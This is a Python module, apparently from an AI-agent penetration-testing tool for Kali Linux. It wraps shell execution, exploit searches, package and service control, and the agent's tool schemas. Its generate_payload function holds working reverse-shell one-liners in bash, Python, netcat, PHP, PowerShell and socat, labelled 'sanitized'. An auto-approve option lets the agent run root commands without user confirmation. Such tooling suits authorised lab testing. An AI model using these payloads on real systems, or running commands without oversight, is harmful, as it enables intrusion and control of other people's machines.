"""tools.py — OS-level execution, Kali Linux tool orchestration, searchsploit, and payload helpers."""
from __future__ import annotations

import json
import os
import re
import shlex
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Any

from . import config, intel as intel_mod, jobs as jobs_mod
from .report_html import generate_html_report


def _find_playbooks_dir() -> Path:
    candidates = [
        Path(__file__).resolve().parents[1] / "playbooks",
        Path.cwd() / "playbooks",
        Path.home() / ".pskill" / "playbooks",
    ]
    for c in candidates:
        if c.exists() and c.is_dir():
            return c
    return candidates[0]


PLAYBOOKS_DIR = _find_playbooks_dir()

SKILLS = [
    "web-recon", "api-testing", "idor-bola", "injection", "http-advanced",
    "ssrf", "oauth-auth", "business-logic", "js-reverse", "apk-reverse",
    "mobile-advanced", "binary-reverse", "cloud-security", "ad-pentest",
    "post-exploit", "ai-llm-security", "reporting",
]


# ── Shell execution ───────────────────────────────────────────────────────────

class CommandResult:
    def __init__(self, cmd: str, stdout: str, stderr: str, returncode: int, cwd: str = ""):
        self.cmd = cmd
        self.stdout = stdout
        self.stderr = stderr
        self.returncode = returncode
        self.cwd = cwd
        self.ok = returncode == 0

    def __str__(self) -> str:
        out = self.stdout.strip()
        err = self.stderr.strip()
        parts = []
        if out:
            parts.append(out)
        if err and not self.ok:
            parts.append(f"[stderr] {err}")
        return "\n".join(parts) or "(no output)"


def run_shell(cmd: str, timeout: int = 180, cwd: str | None = None) -> CommandResult:
    """Execute any bash shell command on Kali Linux with custom cwd and timeout."""
    working_dir = os.path.expanduser(cwd) if cwd else os.getcwd()
    try:
        proc = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=working_dir,
            errors="replace",
            executable="/bin/bash",
        )
        return CommandResult(cmd, proc.stdout, proc.stderr, proc.returncode, cwd=working_dir)
    except subprocess.TimeoutExpired:
        return CommandResult(cmd, "", f"Command timed out after {timeout}s", 124, cwd=working_dir)
    except KeyboardInterrupt:
        return CommandResult(cmd, "", "Command cancelled by user", 130, cwd=working_dir)
    except Exception as e:
        return CommandResult(cmd, "", str(e), 1, cwd=working_dir)


# ── Kali OS & Security Helpers ────────────────────────────────────────────────

def search_exploits(query: str, cve: str = "") -> str:
    """Search local Kali searchsploit database and Exploit-DB for known vulnerabilities."""
    search_term = cve if cve else query
    if not search_term:
        return "Please provide a query or CVE to search."

    cmd = f"searchsploit {shlex.quote(search_term)}"
    res = run_shell(cmd, timeout=20)
    if not res.ok and "not found" in res.stderr.lower():
        return "searchsploit is not installed. Run: sudo apt install -y exploitdb"
    return str(res)


def get_network_info() -> dict[str, Any]:
    """Retrieve detailed IP and interface information (tun0 VPN, eth0, wlan0, default gateway)."""
    def _run(c: str) -> str:
        return run_shell(c, timeout=5).stdout.strip()

    ip_brief = _run("ip -brief address || ifconfig")
    gateway = _run("ip route | grep default | head -n 1")
    tun0 = _run("ip -brief addr show tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1")
    eth0 = _run("ip -brief addr show eth0 2>/dev/null | awk '{print $3}' | cut -d/ -f1")

    return {
        "tun0_vpn_ip": tun0 or "(not connected)",
        "eth0_ip": eth0 or "(not assigned)",
        "default_gateway": gateway or "unknown",
        "interfaces_summary": ip_brief,
    }


def generate_payload(payload_type: str, lhost: str, lport: int = 9001, format_type: str = "bash") -> dict[str, str]:
    """Generate sanitized reverse shell one-liners and listener commands."""
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_subshell": f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'",
        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}",
        "socat": f"socat tcp-connect:{lhost}:{lport} exec:'/bin/bash',pty,stderr,setsid,sigint,sane",
    }

    selected_payload = payloads.get(format_type.lower(), payloads["bash"])
    listener_nc = f"nc -lvnp {lport}"
    listener_pwncat = f"pwncat-cs -lp {lport}"

    return {
        "payload": selected_payload,
        "listener_netcat": listener_nc,
        "listener_pwncat": listener_pwncat,
        "lhost": lhost,
        "lport": str(lport),
    }


def get_system_diagnostics() -> dict[str, Any]:
    """Get rich OS diagnostics from Kali Linux."""
    def _run(c: str) -> str:
        return run_shell(c, timeout=10).stdout.strip()

    return {
        "os": _run("cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'"),
        "kernel": _run("uname -r"),
        "architecture": _run("uname -m"),
        "user": _run("whoami"),
        "hostname": _run("hostname"),
        "ip_interfaces": _run("ip -brief address || ifconfig"),
        "listening_ports": _run("ss -tuln | head -n 25 || netstat -tuln | head -n 25"),
        "memory_usage": _run("free -h"),
        "disk_usage": _run("df -h /"),
        "active_services": _run("systemctl list-units --type=service --state=running | head -n 20"),
    }


def manage_system_service(service_name: str, action: str) -> str:
    """Start, stop, restart, enable, or inspect system services."""
    action = action.lower().strip()
    if action not in ("status", "start", "stop", "restart", "enable", "disable", "reload"):
        return f"Invalid action: {action}. Supported: status, start, stop, restart, enable, disable, reload."

    cmd = f"sudo systemctl {action} {shlex.quote(service_name)}" if action != "status" else f"systemctl status {shlex.quote(service_name)}"
    res = run_shell(cmd, timeout=30)
    return str(res)


def manage_packages(manager: str, action: str, package_name: str) -> str:
    """Install, update, or remove software using apt, pip, go, cargo, or git."""
    manager = manager.lower().strip()
    action = action.lower().strip()
    pkg = shlex.quote(package_name)

    if manager == "apt":
        if action == "install":
            cmd = f"sudo apt-get update && sudo apt-get install -y {pkg}"
        elif action == "remove":
            cmd = f"sudo apt-get remove -y {pkg}"
        elif action == "search":
            cmd = f"apt-cache search {pkg}"
        else:
            return f"Unsupported apt action: {action}"
    elif manager == "pip":
        if action == "install":
            cmd = f"pip install {pkg}"
        elif action == "remove":
            cmd = f"pip uninstall -y {pkg}"
        elif action == "list":
            cmd = f"pip list | grep -i {pkg}"
        else:
            return f"Unsupported pip action: {action}"
    elif manager == "go":
        cmd = f"go install {pkg}@latest"
    elif manager == "git":
        cmd = f"git clone {pkg}"
    elif manager == "cargo":
        cmd = f"cargo install {pkg}"
    else:
        return f"Unknown package manager: {manager}. Supported: apt, pip, go, cargo, git."

    res = run_shell(cmd, timeout=300)
    return str(res)


def find_files(path: str, pattern: str = "", content_search: str = "", max_results: int = 50) -> str:
    """Search for files and directories or grep for content across Kali filesystem."""
    search_dir = os.path.expanduser(path)
    if not os.path.exists(search_dir):
        return f"Directory does not exist: {search_dir}"

    if content_search:
        cmd = f"grep -rnI --exclude-dir=.git --exclude-dir=__pycache__ {shlex.quote(content_search)} {shlex.quote(search_dir)} | head -n {max_results}"
    elif pattern:
        cmd = f"find {shlex.quote(search_dir)} -name {shlex.quote(pattern)} | head -n {max_results}"
    else:
        cmd = f"ls -la {shlex.quote(search_dir)} | head -n {max_results}"

    res = run_shell(cmd, timeout=30)
    return str(res)


# ── Built-in tool schemas for AI Agent ────────────────────────────────────────

TOOL_SCHEMAS = [
    {
        "name": "run_command",
        "description": (
            "Execute any bash shell command on Kali Linux with full root/sudo capabilities. "
            "Run security tools (nmap, ffuf, nuclei, sqlmap, hydra, metasploit, john, hashcat, "
            "gobuster, burp, wireshark, aircrack-ng, ghidra, impacket, etc.) or system commands. "
            "Set `background: true` for long-running scans."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "The exact shell command string to execute"},
                "description": {"type": "string", "description": "Brief explanation of what this command accomplishes"},
                "cwd": {"type": "string", "description": "Optional working directory"},
                "background": {"type": "boolean", "description": "Set to true to launch as a background job (e.g. for big wordlist fuzzing / full port scans)"},
                "timeout": {"type": "integer", "description": "Timeout in seconds for foreground commands (default 180)"},
            },
            "required": ["command", "description"],
        },
    },
    {
        "name": "search_exploits",
        "description": "Query the local Kali Linux searchsploit database and Exploit-DB for known vulnerabilities, CVEs, and exploit PoCs.",
        "parameters": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Service name and version (e.g. 'Apache 2.4.49', 'OpenSSH 8.5p1', 'WordPress 5.8')"},
                "cve": {"type": "string", "description": "Optional CVE ID (e.g. 'CVE-2021-41773')"},
            },
            "required": ["query"],
        },
    },
    {
        "name": "get_network_info",
        "description": "Inspect active network interfaces, IP addresses (including tun0 VPN for HackTheBox/Labs), default gateway, and socket status.",
        "parameters": {
            "type": "object",
            "properties": {},
        },
    },
    {
        "name": "generate_payload",
        "description": "Generate sanitized reverse shell command one-liners and corresponding netcat/pwncat listeners.",
        "parameters": {
            "type": "object",
            "properties": {
                "lhost": {"type": "string", "description": "Local listening IP (e.g. tun0 IP, 10.10.14.x)"},
                "lport": {"type": "integer", "description": "Local listening port (default 9001)"},
                "format_type": {
                    "type": "string",
                    "enum": ["bash", "bash_subshell", "python", "nc", "php", "powershell", "socat"],
                    "description": "Target payload language/shell format",
                },
            },
            "required": ["lhost"],
        },
    },
    {
        "name": "get_system_info",
        "description": "Inspect Kali Linux system diagnostics: OS version, kernel, IP addresses, listening ports, memory, disk, and active services.",
        "parameters": {
            "type": "object",
            "properties": {},
        },
    },
    {
        "name": "manage_service",
        "description": "Manage Linux systemd services (start, stop, restart, status, enable) such as postgresql, docker, apache2, ssh, tor, openvpn.",
        "parameters": {
            "type": "object",
            "properties": {
                "service_name": {"type": "string", "description": "Name of the systemd service (e.g. postgresql, docker, ssh, apache2)"},
                "action": {"type": "string", "enum": ["status", "start", "stop", "restart", "enable", "disable", "reload"], "description": "Action to perform"},
            },
            "required": ["service_name", "action"],
        },
    },
    {
        "name": "manage_packages",
        "description": "Install, update, or search for software packages and security tools using apt, pip, go, cargo, or git.",
        "parameters": {
            "type": "object",
            "properties": {
                "manager": {"type": "string", "enum": ["apt", "pip", "go", "cargo", "git"], "description": "Package manager to use"},
                "action": {"type": "string", "enum": ["install", "remove", "search", "list"], "description": "Action to perform"},
                "package_name": {"type": "string", "description": "Name of the package, tool, or git repository URL"},
            },
            "required": ["manager", "action", "package_name"],
        },
    },
    {
        "name": "find_files",
        "description": "Search for files by name pattern or search inside file contents (grep) across the filesystem.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Base directory to search from"},
                "pattern": {"type": "string", "description": "File name pattern to find"},
                "content_search": {"type": "string", "description": "Text or regex string to search inside file contents"},
                "max_results": {"type": "integer", "description": "Maximum results to return (default 50)"},
            },
            "required": ["path"],
        },
    },
    {
        "name": "read_file",
        "description": "Read contents of any local file from the Kali filesystem.",
        "parameters": {
            "type": "object",
            "properties": {"path": {"type": "string", "description": "Path to file to read"}},
            "required": ["path"],
        },
    },
    {
        "name": "write_file",
        "description": "Write or create a file on the Kali filesystem.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Destination file path"},
                "content": {"type": "string", "description": "Text or code content to write"},
            },
            "required": ["path", "content"],
        },
    },
    {
        "name": "update_intel",
        "description": "Save target assets, endpoints, technologies, notes, or confirmed vulnerabilities to target state in intel.json.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target domain, IP, or name"},
                "command": {
                    "type": "string",
                    "enum": ["add-host", "add-endpoint", "add-tech", "add-vuln",
                             "add-param", "mark-done", "mark-blocked", "set-waf", "note"],
                    "description": "State update operation",
                },
                "value": {"type": "string", "description": "Value to record"},
                "severity": {"type": "string", "enum": ["critical", "high", "medium", "low", "info"], "description": "Severity if recording a vulnerability"},
                "reason": {"type": "string", "description": "Reason text if marking an action blocked"},
            },
            "required": ["target", "command", "value"],
        },
    },
    {
        "name": "get_intel",
        "description": "Read the current engagement intelligence state for a target (hosts, open ports, endpoints, technologies, findings).",
        "parameters": {
            "type": "object",
            "properties": {"target": {"type": "string", "description": "Target name or domain"}},
            "required": ["target"],
        },
    },
    {
        "name": "get_playbook",
        "description": "Load the methodology instructions, commands, and checklists for a specific security skill playbook.",
        "parameters": {
            "type": "object",
            "properties": {
                "skill": {"type": "string", "enum": SKILLS, "description": "Name of the skill playbook to load"}
            },
            "required": ["skill"],
        },
    },
]


def execute_tool(name: str, args: dict[str, Any], confirm_fn=None) -> str:
    """
    Dispatch a tool call. confirm_fn(cmd, desc) -> bool is called for shell commands.
    Returns string result to feed back to the model.
    """
    if name == "run_command":
        cmd = args.get("command", "")
        desc = args.get("description", "")
        cwd = args.get("cwd")
        is_bg = args.get("background", False)
        timeout = int(args.get("timeout", 180))

        if not cmd:
            return "Error: No command provided."

        if confirm_fn and not config.get("auto_approve", False):
            approved = confirm_fn(cmd, desc)
            if not approved:
                return "Command execution was denied by user."

        if is_bg:
            job = jobs_mod.start_job(cmd, desc, cwd=cwd)
            return (
                f"Started background job {job['id']} (PID {job['pid']}).\n"
                f"Log file: {job['log_path']}\n"
                "Use /jobs or /attach <id> to monitor progress."
            )

        result = run_shell(cmd, timeout=timeout, cwd=cwd)
        output = str(result)
        if len(output) > 12000:
            output = output[:12000] + "\n... [truncated for token limit]"
        return f"Exit code {result.returncode}:\n{output}"

    elif name == "search_exploits":
        query = args.get("query", "")
        cve = args.get("cve", "")
        return search_exploits(query, cve)

    elif name == "get_network_info":
        return json.dumps(get_network_info(), indent=2)

    elif name == "generate_payload":
        lhost = args.get("lhost", "")
        lport = int(args.get("lport", 9001))
        fmt = args.get("format_type", "bash")
        return json.dumps(generate_payload(fmt, lhost, lport, fmt), indent=2)

    elif name == "get_system_info":
        try:
            diag = get_system_diagnostics()
            return json.dumps(diag, indent=2)
        except Exception as e:
            return f"Error gathering diagnostics: {e}"

    elif name == "manage_service":
        svc = args.get("service_name", "")
        action = args.get("action", "")
        if confirm_fn and action != "status" and not config.get("auto_approve", False):
            approved = confirm_fn(f"sudo systemctl {action} {svc}", f"{action} system service {svc}")
            if not approved:
                return "Service action was denied by user."
        return manage_system_service(svc, action)

    elif name == "manage_packages":
        mgr = args.get("manager", "")
        act = args.get("action", "")
        pkg = args.get("package_name", "")
        if confirm_fn and act in ("install", "remove") and not config.get("auto_approve", False):
            approved = confirm_fn(f"{mgr} {act} {pkg}", f"{act} package {pkg} using {mgr}")
            if not approved:
                return "Package operation was denied by user."
        return manage_packages(mgr, act, pkg)

    elif name == "find_files":
        p = args.get("path", "")
        pattern = args.get("pattern", "")
        content = args.get("content_search", "")
        max_r = int(args.get("max_results", 50))
        return find_files(p, pattern, content, max_r)

    elif name == "read_file":
        try:
            p = Path(args.get("path", "")).expanduser()
            if not p.exists():
                return f"File does not exist: {p}"
            content = p.read_text(errors="replace")
            if len(content) > 15000:
                content = content[:15000] + "\n... [truncated]"
            return content
        except Exception as e:
            return f"Error reading file: {e}"

    elif name == "write_file":
        try:
            p = Path(args.get("path", "")).expanduser()
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(args.get("content", ""))
            return f"File written successfully: {p}"
        except Exception as e:
            return f"Error writing file: {e}"

    elif name == "update_intel":
        target = args.get("target", "")
        if not target:
            return "Error: Target is required for update_intel."
        try:
            intel_mod.update(
                target,
                args.get("command", ""),
                args.get("value", ""),
                args.get("severity", "info"),
                args.get("reason", ""),
            )
            return f"Intel updated for '{target}': {args.get('command')} → {args.get('value')}"
        except Exception as e:
            return f"Error updating intel: {e}"

    elif name == "get_intel":
        target = args.get("target", "")
        data = intel_mod.load(target)
        if not data:
            return f"No engagement found for target '{target}'. Use /init to create one."
        return json.dumps(data, indent=2)

    elif name == "get_playbook":
        skill = args.get("skill", "")
        playbook_dir = _find_playbooks_dir()
        md = playbook_dir / skill / "SKILL.md"
        if not md.exists():
            return f"Playbook not found for '{skill}'. Available: {SKILLS}"
        content = md.read_text(errors="replace")
        if len(content) > 15000:
            content = content[:15000] + "\n... [truncated]"
        return content

    return f"Unknown tool: {name}"
